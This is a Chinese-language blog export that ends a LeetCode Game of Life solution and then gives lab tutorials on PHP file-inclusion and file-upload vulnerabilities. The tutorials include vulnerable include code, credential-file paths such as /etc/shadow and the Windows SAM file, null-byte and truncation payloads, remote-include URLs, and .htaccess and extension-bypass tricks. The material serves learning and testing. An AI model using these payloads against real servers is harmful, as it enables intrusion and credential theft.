class="title">gameOfLife</span><span class="params">(self, board)</span>:</span></span><br><span class="line">        <span class="string">"""</span></span><br><span class="line"><span class="string">        :type board: List[List[int]]</span></span><br><span class="line"><span class="string">        :rtype: None Do not return anything, modify board in-place instead.</span></span><br><span class="line"><span class="string">        """</span></span><br><span class="line">        new = []</span><br><span class="line">        <span class="keyword">for</span> i <span class="keyword">in</span> range(len(board)):</span><br><span class="line">            subnew = []</span><br><span class="line">            <span class="keyword">for</span> j <span class="keyword">in</span> range(len(board[<span class="number">0</span>])):</span><br><span class="line">                subnew.append(self.now(i,j,self.environment(i,j,board),board))</span><br><span class="line">            new.append(subnew)</span><br><span class="line">        <span class="keyword">for</span> i <span class="keyword">in</span> range(len(new)):</span><br><span class="line">            <span class="keyword">for</span> j <span class="keyword">in</span> range(len(new[<span class="number">0</span>])):</span><br><span class="line">                board[i][j] = new[i][j]</span><br></pre></td></tr></table></figure>

<p><img src="https://s1.ax1x.com/2020/04/19/JMSl1f.png" alt="JMSl1f.png"></p>
<p><strong>解析：</strong></p>
<p>这道题的大致思路就是遍历二维数据的每一个元素，查询一下周围的元素状态，看他们符合条件的哪一种，来决定当前元素的变化，值得注意的是：</p>
<ol>
<li>对于边界元素的处理。</li>
<li>对于改变元素的值是全部元素同时发生，不要出现异步处理的情况。</li>
</ol>
<p>对于第一个问题，我使用了<code>check</code>函数来检查当前元素是否符合规范，对于不合规范的值我视为0，这是因为在对周围元素处理处理的过程中，元素死为0，活为1，来统计周围元素环境的时候，我可以对周围元素的值进行加和，利用加和值判定条件，这里也是<code>environment</code>函数的工作原理，也就因为当不合规范的值置为0时，才对加和值无影响。</p>
<p><code>check</code> 函数：</p>
<figure class="highlight python"><table><tr><td class="code"><pre><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">check</span><span class="params">(self,i,j,board)</span>:</span></span><br><span class="line">    <span class="keyword">if</span> i == len(board) <span class="keyword">or</span> i == <span class="number">-1</span> <span class="keyword">or</span> j == len(board[<span class="number">0</span>]) <span class="keyword">or</span> j == <span class="number">-1</span>:</span><br><span class="line">            <span class="keyword">return</span> <span class="number">0</span></span><br><span class="line">    <span class="keyword">return</span> board[i][j]</span><br></pre></td></tr></table></figure>

<p><code>environment</code>函数：(这里写的粗糙了，可以用位移数组来进行优化)</p>
<figure class="highlight python"><table><tr><td class="code"><pre><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">environment</span><span class="params">(self,i,j,board)</span>:</span></span><br><span class="line">    <span class="keyword">return</span> self.check(i<span class="number">-1</span>,j<span class="number">-1</span>,board)+self.check(i<span class="number">-1</span>,j,board)+self.check(i<span class="number">-1</span>,j+<span class="number">1</span>,board)+self.check(i,j<span class="number">-1</span>,board)+self.check(i,j+<span class="number">1</span>,board)+self.check(i+<span class="number">1</span>,j<span class="number">-1</span>,board)+self.check(i+<span class="number">1</span>,j,board)+self.check(i+<span class="number">1</span>,j+<span class="number">1</span>,board)</span><br></pre></td></tr></table></figure>

<p>最后，关于当前元素的变化规则，我也用了<code>now</code>函数来返回：</p>
<figure class="highlight python"><table><tr><td class="code"><pre><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">now</span><span class="params">(self,i,j,k,board)</span>:</span></span><br><span class="line">    <span class="keyword">if</span> board[i][j] == <span class="number">1</span>:</span><br><span class="line">        <span class="keyword">if</span> k == <span class="number">2</span> <span class="keyword">or</span> k== <span class="number">3</span>:</span><br><span class="line">            <span class="keyword">return</span> <span class="number">1</span></span><br><span class="line">    <span class="keyword">if</span> board[i][j] == <span class="number">0</span> <span class="keyword">and</span> k == <span class="number">3</span>:</span><br><span class="line">        <span class="keyword">return</span> <span class="number">1</span></span><br><span class="line">    <span class="keyword">return</span> <span class="number">0</span></span><br></pre></td></tr></table></figure>

<p>在这个算法中的时间复杂度O(mn)，空间复杂度也是O(mn)。</p>
<p>其实可以使空间复杂度为O(1)，那就是使用原数组的内存空间(一个int类型为32位大小，仅仅存储0和1两种状态还有大部分空间没有被用到)，但是要保证其元素的变化是同步进行的，也就是说不会产生异步影响，即当前元素变化导致其他元素对该变化在这次变化中进行变化(有点绕，其实也好理解，就是说，大家状态值要变就一起变，不要我变了，你才变)。</p>
<p>那么这时候可以引进新的状态值，即2和3，自定义2为<code>0 --&gt;1</code>和3为<code>1--&gt;0</code>，对于上一次变化来说碰到2就当作0来处理，碰到3就当作1来处理，最后对于下一次变化，碰到2设置为1，碰到3设置为0。</p>
<p>这个方法极大的减少了当二位数组太大的情况下的内存空间的浪费(PS:我懒得写这个方法的代码了，思路就是上面的思路)</p>
]]></content>
      <categories>
        <category>LeetCode题解</category>
      </categories>
      <tags>
        <tag>python</tag>
      </tags>
  </entry>
  <entry>
    <title>文件包含漏洞</title>
    <url>/2020/04/06/%E6%96%87%E4%BB%B6%E5%8C%85%E5%90%AB%E6%BC%8F%E6%B4%9E/</url>
    <content><![CDATA[<h1 id="前言"><a href="#前言" class="headerlink" title="前言"></a>前言</h1><p>（冲冲冲，继续学习。）</p>
<p>什么是文件包含漏洞？</p>
<p>服务器通过PHP的特性去包含任意文件时，对文件来源过滤不严，从而可以包含一个恶意文件。</p>
<p>简要来说，服务器执行PHP文件时，可以通过文件包含函数加载另一个文件中的PHP代码，并且当PHP来执行，这会为开发者节省大量的时间，但是如果这个包含的文件是变量或者用户可以篡改的，且开发人员过滤不严，那么就有可能包含一个恶意文件，导致服务器遭到侵害。</p>
<p>（注意：文件包含不止在PHP中，只是PHP比较严重而已，其他脚本语言例如JSP，ASP也有文件包含漏洞）</p>
<a id="more"></a>

<h1 id="PHP中关于文件包含的函数"><a href="#PHP中关于文件包含的函数" class="headerlink" title="PHP中关于文件包含的函数"></a>PHP中关于文件包含的函数</h1><p>PHP中文件包含函数有以下四种：</p>
<blockquote>
<p>require()</p>
<p>require_once()</p>
<p>include()</p>
<p>include_once()</p>
</blockquote>
<p><code>include</code>和<code>require</code>区别主要是，<code>include</code>在包含的过程中如果出现错误，会抛出一个警告，程序继续正常运行；而<code>require</code>函数出现错误的时候，会直接报错并退出程序的执行。</p>
<p>而<code>include_once()</code>，<code>require_once()</code>这两个函数，与前两个的不同之处在于这两个函数只包含一次，适用于在脚本执行期间同一个文件有可能被包括超过一次的情况下，你想确保它只被包括一次以避免函数重定义，变量重新赋值等问题。</p>
<p>当使用这4个函数包含一个新文件时，该文件将作为PHP代码执行，PHP内核并不会在意被包含的文件类型，只要文件中含有PHP代码既可以服务器所解析。</p>
<h1 id="PHP文件包含利用"><a href="#PHP文件包含利用" class="headerlink" title="PHP文件包含利用"></a>PHP文件包含利用</h1><p>当出现以下两种情况的时候，就可以利用到文件包含漏洞：</p>
<ol>
<li>include等函数通过变量控制需要包含的文件</li>
<li>用户能够控制这些变量</li>
</ol>
<h2 id="本地文件包含LFI"><a href="#本地文件包含LFI" class="headerlink" title="本地文件包含LFI"></a>本地文件包含LFI</h2><p>举一个简单例子：</p>
<figure class="highlight php"><table><tr><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span></span><br><span class="line"><span class="keyword">include</span>($_GET[file]);</span><br><span class="line"><span class="meta">?&gt;</span></span><br></pre></td></tr></table></figure>

<p>这个<code>test</code>中可以看到由用户可以控制的<code>$_GET</code>传入的参数<code>file</code>可以指定<code>include</code>函数所包含的文件</p>
<p>我们在该目录建立一个txt文件，其中包含PHP代码</p>
<p><img src="https://s1.ax1x.com/2020/04/14/JpCGyF.png" alt="JpCGyF.png"></p>
<p>URL为:<code>http://localhost/file_include/test.php?file=1.txt</code></p>
<p><img src="https://s1.ax1x.com/2020/04/14/JpVpX6.png" alt="JpVpX6.png"></p>
<p>如果是不加限制的文件包含漏洞，那么我们可以使用目录遍历漏洞轻易的知道很多敏感信息，比如：</p>
<p>Windows系统</p>
<blockquote>
<p>c:\boot.ini // 查看系统版本</p>
<p>c:\windows\system32\inetsrv\MetaBase.xml // IIS配置文件</p>
<p>c:\windows\repair\sam // 存储Windows系统初次安装的密码</p>
<p>c:\ProgramFiles\mysql\my.ini // MySQL配置</p>
<p>c:\ProgramFiles\mysql\data\mysql\user.MYD // MySQL root密码</p>
<p>c:\windows\php.ini // php 配置信息</p>
</blockquote>
<p>Linux/Unix系统</p>
<blockquote>
<p>/etc/passwd // 账户信息</p>
<p>/etc/shadow // 账户密码文件</p>
<p>/usr/local/app/apache2/conf/httpd.conf // Apache2默认配置文件</p>
<p>/usr/local/app/apache2/conf/extra/httpd-vhost.conf // 虚拟网站配置</p>
<p>/usr/local/app/php5/lib/php.ini // PHP相关配置</p>
<p>/etc/httpd/conf/httpd.conf // Apache配置文件</p>
<p>/etc/my.conf // mysql 配置文件    </p>
</blockquote>
<p>​    一般可以将本地文件包含配合文件上传漏洞使用，文件上传漏洞可以看我之前的博客，假若攻击者上传webshell到服务器上，只需知道其路径和名称，就可以配合文件包含漏洞使用，但是这里面有个问题。</p>
<p>如果关于文件包含的代码如下所示：</p>
<figure class="highlight php"><table><tr><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span></span><br><span class="line">    $filename  = $_GET[<span class="string">'filename'</span>];</span><br><span class="line">    <span class="keyword">include</span>($filename . <span class="string">".html"</span>);</span><br><span class="line"><span class="meta">?&gt;</span></span><br></pre></td></tr></table></figure>

<p>只会在请求中获取文件名，在代码中加入后缀名。</p>
<p>这个时候我们可以用到%00截断，因为php的内核是用c实现的，因此使用了一些字符串处理函数，在连接字符串的时候，0字节(\x00)可以看作字符串结束符。那么我们就可以使用%00截断来实现绕过。但是有个前提条件：<code>magic_quotes_gpc = Off</code>且php版本&lt;5.3.4，因为当<code>magic_quotes_gpc = On</code>时候，会将%00看作NULL处理。</p>
<p>还有一种就是路径长度截断：</p>
<p>条件：windows OS，点号需要长于256；linux OS 长于4096</p>
<blockquote>
<p>Windows下目录最大长度为256字节，超出的部分会被丢弃；</p>
<p>Linux下目录最大长度为4096字节，超出的部分会被丢弃。</p>
</blockquote>
<p>可以用到这样的文件名：</p>
<p><code>test.txt/./././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././/././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././/././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././/././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././/./././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././</code></p>
<p>在windows环境下还可以使用点号截断：</p>
<p>条件：windows OS，点号需要长于256</p>
<p>举例：</p>
<p><code>filename=test.txt.................................................................................................................................................................................................................................................................................................................................................................................................................................................................................................................................................................................................................................................................................................................................................................................................................................................................................................................................................................................................................................................................................................................................................................................................................................................................</code></p>
<h2 id="远程文件包含RFI"><a href="#远程文件包含RFI" class="headerlink" title="远程文件包含RFI"></a>远程文件包含RFI</h2><p>PHP的配置文件allow_url_fopen和allow_url_include设置为ON，include/require等包含函数可以加载远程文件，如果远程文件没经过严格的过滤，导致了执行恶意文件的代码，这就是远程文件包含漏洞。</p>
<blockquote>
<p>allow_url_fopen = On（是否允许打开远程文件，默认开启）</p>
<p>allow_url_include = On（是否允许include/require远程文件，默认关闭）</p>
</blockquote>
<p>举例：</p>
<p>引用上面的测试代码</p>
<figure class="highlight php"><table><tr><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span></span><br><span class="line"><span class="keyword">include</span>($_GET[file]);</span><br><span class="line"><span class="meta">?&gt;</span></span><br></pre></td></tr></table></figure>

<p><code>http://localhost/file_include/test.php?file=http://192.168.0.102/1.txt</code></p>
<p><img src="https://s1.ax1x.com/2020/04/19/JKwvZV.png" alt="JKwvZV.png"></p>
<p>如果远程文件包含也使用了如下：</p>
<figure class="highlight php"><table><tr><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span></span><br><span class="line">    $filename  = $_GET[<span class="string">'filename'</span>];</span><br><span class="line">    <span class="keyword">include</span>($filename . <span class="string">".html"</span>);</span><br><span class="line"><span class="meta">?&gt;</span></span><br></pre></td></tr></table></figure>

<p>那么可以使用<code>?</code>和<code>#</code>进行绕过：</p>
<p><code>http://localhost/file_include/test.php?file=http://192.168.0.102/1.txt?</code></p>
<p><code>http://localhost/file_include/test.php?file=http://192.168.0.102/1.txt#</code></p>
<h1 id="本地文件包含的利用技巧"><a href="#本地文件包含的利用技巧" class="headerlink" title="本地文件包含的利用技巧"></a>本地文件包含的利用技巧</h1><p>在本地文件包含中如何执行php代码，这也是具有方法的。</p>
<p>远程文件包含之所以可以执行命令，就是因为攻击者可以自定义被包含的文件内容，因此本地文件包含漏洞想要执行命令，也需要找到一个可以被攻击者能控制内容的文件。</p>
<p>一般来说，有以下几种：</p>
<ol>
<li>包含用户上传的文件 (这个配合文件上传漏洞)</li>
<li>包含data://或者php://input等伪协议(这个利用下面那个文章里面有)</li>
<li>包含Session文件(这个我尝试过，可用空间不大，应用范围比较小)</li>
<li>包含日志文件</li>
<li>包含其他上传的临时文件，以及其他应用所创建的临时文件</li>
</ol>
<p>这些利用方式具体得看实战环境，之后我会慢慢介绍。</p>
<p>同时，推荐这篇文章，关于文件包含漏洞写的不错，<a href="https://www.freebuf.com/articles/web/182280.html" target="_blank" rel="noopener">文件包含漏洞</a></p>
]]></content>
      <categories>
        <category>渗透测试</category>
      </categories>
      <tags>
        <tag>文件包含漏洞</tag>
      </tags>
  </entry>
  <entry>
    <title>文件上传漏洞</title>
    <url>/2020/04/01/%E6%96%87%E4%BB%B6%E4%B8%8A%E4%BC%A0%E6%BC%8F%E6%B4%9E/</url>
    <content><![CDATA[<h1 id="前言"><a href="#前言" class="headerlink" title="前言"></a>前言</h1><p>什么是文件上传？</p>
<p>将客户端数据以文件形式封装，通过网络协议发送到服务端，保存在服务端中，在硬盘上作为真实文件形式进行保存。</p>
<p>文件上传功能本身没有问题，是正常的业务需求，但有问题的是文件上传后，服务器怎么处理，解释文件，这样就造就了文件上传漏洞(file up load vulnerability)</p>
<a id="more"></a>

<h1 id="正文"><a href="#正文" class="headerlink" title="正文"></a>正文</h1><p>大多数情况下，文件上传漏洞一般都是指上传一个web脚本能够被服务器解析，也就是webshell的问题。要完成这个，要满足一下几个条件：</p>
<ol>
<li>上传的文件要能够被web容器所解析。那么上传文件所在的目录要是web容器所覆盖的路径。</li>
<li>用户能够从web上访问这个文件。</li>
<li>文件内容不能被安全检查，格式化，图片压缩等改变了内容，否则服务器解析不了文件。</li>
</ol>
<p>之前的博客中我有关于文件上传漏洞的内容——<a href="https://bmoos.github.io/2020/02/23/渗透测试实战-家用电脑/">“渗透测试实战–家用电脑”</a></p>
<p>（现在回头来看简直是小白中的小白，我都不知道自己是如何敢取这个名字的）</p>
<p>简单来说如果发现客户端对用户上传文件没有进行过滤审查或者审查不严，就有可能造成文件上传漏洞。</p>
<h1 id="安全检测"><a href="#安全检测" class="headerlink" title="安全检测"></a>安全检测</h1><p>一般的开发者都会对用户上传文件进行检测，而一般的检测方式为：</p>
<ol>
<li>客户端JavaScript检测</li>
<li>服务端MIME类型检测</li>
<li>黑名单扩展名过滤</li>
<li>白名单扩展名过滤</li>
<li>文件内容检测</li>
</ol>
<p>这里分别对其进行介绍和其绕过方式的介绍</p>
<h2 id="客户端JavaScript检测"><a href="#客户端JavaScript检测" class="headerlink" title="客户端JavaScript检测"></a>客户端JavaScript检测</h2><p>这种方式对一般用户来说可以限制住其上传的文件类型，但是对于攻击者或者稍微懂技术的人员来说，简直形同虚设。</p>
<p>我们用<a href="https://github.com/c0ny1/upload-labs" target="_blank" rel="noopener">upload-labs</a>进行举例：</p>
<p>这个是pass-01中的代码片段：</p>
<figure class="highlight javascript"><table><tr><td class="code"><pre><span class="line"><span class="function"><span class="keyword">function</span> <span class="title">checkFile</span>(<span class="params"></span>) </span>&#123;</span><br><span class="line">    <span class="keyword">var</span> file = <span class="built_in">document</span>.getElementsByName(<span class="string">'upload_file'</span>)[<span class="number">0</span>].value;</span><br><span class="line">    <span class="keyword">if</span> (file == <span class="literal">null</span> || file == <span class="string">""</span>) &#123;</span><br><span class="line">        alert(<span class="string">"请选择要上传的文件!"</span>);</span><br><span class="line">        <span class="keyword">return</span> <span class="literal">false</span>;</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="comment">//定义允许上传的文件类型</span></span><br><span class="line">    <span class="keyword">var</span> allow_ext = <span class="string">".jpg|.png|.gif"</span>;</span><br><span class="line">    <span class="comment">//提取上传文件的类型</span></span><br><span class="line">    <span class="keyword">var</span> ext_name = file.substring(file.lastIndexOf(<span class="string">"."</span>));</span><br><span class="line">    <span class="comment">//判断上传文件类型是否允许上传</span></span><br><span class="line">    <span class="keyword">if</span> (allow_ext.indexOf(ext_name + <span class="string">"|"</span>) == <span class="number">-1</span>) &#123;</span><br><span class="line">        <span class="keyword">var</span> errMsg = <span class="string">"该文件不允许上传，请上传"</span> + allow_ext + <span class="string">"类型的文件,当前文件类型为："</span> + ext_name;</span><br><span class="line">        alert(errMsg);</span><br><span class="line">        <span class="keyword">return</span> <span class="literal">false</span>;</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>

<p>这种只在前端使用JavaScript进行验证可以通过多种方式进行绕过，这里我使用的是burpsuite</p>
<p>我们可以将写的webshell(关于webshell写法上面的博客链接中有说到，此处不谈)文件后缀改成合适的，比如jpg，png，gif等，然后burpsuite将http包截获并修改包内文件后缀名：</p>
<p><img src="https://s1.ax1x.com/2020/04/02/GtEQuq.png" alt="GtEQuq.png"></p>
<p>将此处文件后缀名修改成php就行</p>
<p><img src="https://s1.ax1x.com/2020/04/02/GtEoa8.png" alt="GtEoa8.png"></p>
<p>改成php后缀名就可以绕过前端检测，客户端验证只是用来防止用户输入错误，减少服务器开销，而真正的验证还得看服务端验证。</p>
<h2 id="服务端MIME类型检测"><a href="#服务端MIME类型检测" class="headerlink" title="服务端MIME类型检测"></a>服务端MIME类型检测</h2><p>在介绍这种验证方式之前，先得介绍一下MIME类型是个啥</p>
<blockquote>
<p>MIME (<strong>M</strong>ultipurpose <strong>I</strong>nternet <strong>M</strong>ail <strong>E</strong>xtensions) 是描述消息内容类型的因特网标准。</p>
<p>MIME 消息能包含文本、图像、音频、视频以及其他应用程序专用的数据。</p>
<p>媒体类型通常是使用 HTTP 协议，通过 Content-Type 来表示的，例如:</p>
<p>Content-Type: text/HTML</p>
<p>媒体类型对文件传输时文件类型进行了标注</p>
</blockquote>
<p>刚好upload-labs中pass-02就是一个MIME类型检测，代码片段如下：</p>
<figure class="highlight php"><table><tr><td class="code"><pre><span class="line">$is_upload = <span class="keyword">false</span>;</span><br><span class="line">$msg = <span class="keyword">null</span>;</span><br><span class="line"><span class="keyword">if</span> (<span class="keyword">isset</span>($_POST[<span class="string">'submit'</span>])) &#123;</span><br><span class="line">    <span class="keyword">if</span> (file_exists(UPLOAD_PATH)) &#123;</span><br><span class="line">        <span class="keyword">if</span> (($_FILES[<span class="string">'upload_file'</span>][<span class="string">'type'</span>] == <span class="string">'image/jpeg'</span>) || ($_FILES[<span class="string">'upload_file'</span>][<span class="string">'type'</span>] == <span class="string">'image/png'</span>) || ($_FILES[<span class="string">'upload_file'</span>][<span class="string">'type'</span>] == <span class="string">'image/gif'</span>)) &#123;</span><br><span class="line">            $temp_file = $_FILES[<span class="string">'upload_file'</span>][<span class="string">'tmp_name'</span>];</span><br><span class="line">            $img_path = UPLOAD_PATH . <span class="string">'/'</span> . $_FILES[<span class="string">'upload_file'</span>][<span class="string">'name'</span>]            </span><br><span class="line">            <span class="keyword">if</span> (move_uploaded_file($temp_file, $img_path)) &#123;</span><br><span class="line">                $is_upload = <span class="keyword">true</span>;</span><br><span class="line">            &#125; <span class="keyword">else</span> &#123;</span><br><span class="line">                $msg = <span class="string">'上传出错！'</span>;</span><br><span class="line">            &#125;</span><br><span class="line">        &#125; <span class="keyword">else</span> &#123;</span><br><span class="line">            $msg = <span class="string">'文件类型不正确，请重新上传！'</span>;</span><br><span class="line">        &#125;</span><br><span class="line">    &#125; <span class="keyword">else</span> &#123;</span><br><span class="line">        $msg = UPLOAD_PATH.<span class="string">'文件夹不存在,请手工创建！'</span>;</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>

<p>可以发现其中判断语句为</p>
<p><code>if (($_FILES[&#39;upload_file&#39;][&#39;type&#39;] == &#39;image/jpeg&#39;) || ($_FILES[&#39;upload_file&#39;][&#39;type&#39;] == &#39;image/png&#39;) || ($_FILES[&#39;upload_file&#39;][&#39;type&#39;] == &#39;image/gif&#39;))</code></p>
<p>发现只有三种MIME类型通过验证<code>image/jpeg</code> <code>image/png</code> <code>image/gif</code></p>
<p>其实也可以通过我们在pass-01中的方法进行绕过，因为在上传jpg时，客户端会在发送http请求时，将<code>Content-Type</code>字段置为<code>image/jpeg</code></p>
<p><img src="https://s1.ax1x.com/2020/04/03/Gtgf41.png" alt="Gtgf41.png"></p>
<p>当然也可以上传php文件，然后截获http包将其<code>Content-Type：application/php</code>改为<code>Content-Type：image/jpeg</code></p>
<h2 id="黑名单扩展名过滤"><a href="#黑名单扩展名过滤" class="headerlink" title="黑名单扩展名过滤"></a>黑名单扩展名过滤</h2><p>顾名思义，黑名单机制就是将一些禁止上传的文件的后缀名对比上传文件的后缀名，要是有符合的，则禁止上传该文件</p>
<p>这里用upload-labs的pass-03示例(不得不说upload这个项目确实可以，将大部分的文件上传防御机制都包含了，可以在这里练习如何绕过检测)</p>
<figure class="highlight php"><table><tr><td class="code"><pre><span class="line">$is_upload = <span class="keyword">false</span>;</span><br><span class="line">$msg = <span class="keyword">null</span>;</span><br><span class="line"><span class="keyword">if</span> (<span class="keyword">isset</span>($_POST[<span class="string">'submit'</span>])) &#123;</span><br><span class="line">    <span class="keyword">if</span> (file_exists(UPLOAD_PATH)) &#123;</span><br><span class="line">        $deny_ext = <span class="keyword">array</span>(<span class="string">'.asp'</span>,<span class="string">'.aspx'</span>,<span class="string">'.php'</span>,<span class="string">'.jsp'</span>);</span><br><span class="line">        $file_name = trim($_FILES[<span class="string">'upload_file'</span>][<span class="string">'name'</span>]);</span><br><span class="line">        $file_name = deldot($file_name);<span class="comment">//删除文件名末尾的点</span></span><br><span class="line">        $file_ext = strrchr($file_name, <span class="string">'.'</span>);</span><br><span class="line">        $file_ext = strtolower($file_ext); <span class="comment">//转换为小写</span></span><br><span class="line">        $file_ext = str_ireplace(<span class="string">'::$DATA'</span>, <span class="string">''</span>, $file_ext);<span class="comment">//去除字符串::$DATA</span></span><br><span class="line">        $file_ext = trim($file_ext); <span class="comment">//收尾去空</span></span><br><span class="line"></span><br><span class="line">        <span class="keyword">if</span>(!in_array($file_ext, $deny_ext)) &#123;</span><br><span class="line">            $temp_file = $_FILES[<span class="string">'upload_file'</span>][<span class="string">'tmp_name'</span>];</span><br><span class="line">            $img_path = UPLOAD_PATH.<span class="string">'/'</span>.date(<span class="string">"YmdHis"</span>).rand(<span class="number">1000</span>,<span class="number">9999</span>).$file_ext;            </span><br><span class="line">            <span class="keyword">if</span> (move_uploaded_file($temp_file,$img_path)) &#123;</span><br><span class="line">                 $is_upload = <span class="keyword">true</span>;</span><br><span class="line">            &#125; <span class="keyword">else</span> &#123;</span><br><span class="line">                $msg = <span class="string">'上传出错！'</span>;</span><br><span class="line">            &#125;</span><br><span class="line">        &#125; <span class="keyword">else</span> &#123;</span><br><span class="line">            $msg = <span class="string">'不允许上传.asp,.aspx,.php,.jsp后缀文件！'</span>;</span><br><span class="line">        &#125;</span><br><span class="line">    &#125; <span class="keyword">else</span> &#123;</span><br><span class="line">        $msg = UPLOAD_PATH . <span class="string">'文件夹不存在,请手工创建！'</span>;</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>

<p>可以看到这里禁止了<code>asp, aspx, php, jsp</code>文件后缀名</p>
<p>但是黑名单机制是一种不安全的方式，攻击者可以通过多种方式进行绕过：</p>
<ol>
<li><p>攻击者可以找到开发人员忽略的扩展名，比如：.phtml .phps .php5 .pht</p>
<p>前提是apache的<code>httpd.conf</code>中有配置别名解析</p>
<figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">AddType application&#x2F;x-httpd-php .phtml .phps .php5 .pht</span><br></pre></td></tr></table></figure>
</li>
<li><p>上传<code>.htaccess</code>文件，但是需要在<code>httpd.conf</code>中</p>
<p>1.<code>mod_rewrite模块开启</code></p>
<p>2.<code>AllowOverride All</code></p>
<p>此时就可以自定义apache将谁用php进行解析（注意上传时一定确保<code>.htaccess</code>文件名称为<code>.htaccess</code>）</p>
<blockquote>
<p>.htaccess文件(或者”分布式配置文件”）,全称是Hypertext Access(超文本入口)。提供了针对目录改变配置的方法，<br>即在一个特定的文档目录中放置一个包含一个或多个指令的文件， 以作用于此目录及其所有子目录。</p>
<p>可以如下使用：</p>
<figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">&lt;FilesMatch &quot;指定文件名&quot;&gt;</span><br><span class="line">  SetHandler application&#x2F;x-httpd-php</span><br><span class="line">&lt;&#x2F;FilesMatch&gt;</span><br></pre></td></tr></table></figure>

<p>也可以如下使用：</p>
<figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">AddType application&#x2F;x-httpd-php .指定文件后缀名，可以自定义后缀名</span><br></pre></td></tr></table></figure>
</blockquote>
</li>
<li><p>Windows平台对文件扩展名的大小写不敏感，如果服务端没有进行大小写过滤，那就可以通过大小写文件后缀名进行绕过</p>
</li>
<li><p>在Windows平台，如果文件名以<code>.</code>或者空格作为结尾，系统会自动去除，利用此特性也可以绕过黑名单检测(注意文件后缀名可以在burpsuite里改)</p>
</li>
<li><p>在Windows平台上可以上传<code>.php::$DATA</code>绕过（原理是NTFS文件系统包括对备用数据流的支持，主要包括提供与Macintosh文件系统中的文件的兼容性。备用数据流允许文件包含多个数据流。每个文件至少有一个数据流。在Windows中，此默认数据流称为：<code>$ DATA</code>。）</p>
</li>
</ol>
<h2 id="白名单扩展名过滤"><a href="#白名单扩展名过滤" class="headerlink" title="白名单扩展名过滤"></a>白名单扩展名过滤</h2><p>白名单的过滤方式与黑名单的恰恰相反，黑名单是规定不允许上传的文件扩展名，而白名单则是定义允许上传文件扩展名，白名单相比较黑名单安全性大大提高，但是也存在绕过风险，严格来说我之前说的MIME类型检测也是一种白名单机制。</p>
<p>还是用到upload举例，这里看Pass-12：</p>
<figure class="highlight php"><table><tr><td class="code"><pre><span class="line">$is_upload = <span class="keyword">false</span>;</span><br><span class="line">$msg = <span class="keyword">null</span>;</span><br><span class="line"><span class="keyword">if</span>(<span class="keyword">isset</span>($_POST[<span class="string">'submit'</span>]))&#123;</span><br><span class="line">    $ext_arr = <span class="keyword">array</span>(<span class="string">'jpg'</span>,<span class="string">'png'</span>,<span class="string">'gif'</span>);</span><br><span class="line">    $file_ext = substr($_FILES[<span class="string">'upload_file'</span>][<span class="string">'name'</span>],strrpos($_FILES[<span class="string">'upload_file'</span>][<span class="string">'name'</span>],<span class="string">"."</span>)+<span class="number">1</span>);</span><br><span class="line">    <span class="keyword">if</span>(in_array($file_ext,$ext_arr))&#123;</span><br><span class="line">        $temp_file = $_FILES[<span class="string">'upload_file'</span>][<span class="string">'tmp_name'</span>];</span><br><span class="line">        $img_path = $_GET[<span class="string">'save_path'</span>].<span class="string">"/"</span>.rand(<span class="number">10</span>, <span class="number">99</span>).date(<span class="string">"YmdHis"</span>).<span class="string">"."</span>.$file_ext;</span><br><span class="line"></span><br><span class="line">        <span class="keyword">if</span>(move_uploaded_file($temp_file,$img_path))&#123;</span><br><span class="line">            $is_upload = <span class="keyword">true</span>;</span><br><span class="line">        &#125; <span class="keyword">else</span> &#123;</span><br><span class="line">            $msg = <span class="string">'上传出错！'</span>;</span><br><span class="line">        &#125;</span><br><span class="line">    &#125; <span class="keyword">else</span>&#123;</span><br><span class="line">        $msg = <span class="string">"只允许上传.jpg|.png|.gif类型文件！"</span>;</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>

<p>其中白名单设置为：<code>$ext_arr = array(&#39;jpg&#39;,&#39;png&#39;,&#39;gif&#39;);</code></p>
<p> 发现只允许了 <code>&#39;jpg&#39;,&#39;png&#39;,&#39;gif&#39;</code>三种后缀名出现</p>
<p>这个时候绕过的方式就可以根据解析漏洞配合，具体的服务器有不同的解析漏洞，比如说是IIS6.0的目录解析漏洞和WebDav漏洞，以及Apache解析漏洞，等等</p>
<p>在Pass-12题中可以用到%00截断(关于00截断不止下面这种)</p>
<p>可以看到代码中有这两个部分<code>$img_path = $_GET[&#39;save_path&#39;].&quot;/&quot;.rand(10, 99).date(&quot;YmdHis&quot;).&quot;.&quot;.$file_ext;</code>和<code>move_uploaded_file($temp_file,$img_path)</code></p>
<p>在PHP的的有些版本中<code>move_uploaded_file()</code>函数存在漏洞，其exp为<code>move_uploaded_file($_FILES[&#39;x&#39;][&#39;tmp_name&#39;],&quot;/tmp/test.php\x00.jpg&quot;)</code></p>
<p>这里有关于这个漏洞的描述：<a href="https://www.cnblogs.com/cyjaysun/p/4390930.html" target="_blank" rel="noopener">PHP任意文件上传漏洞CVE-2015-2348浅析</a></p>
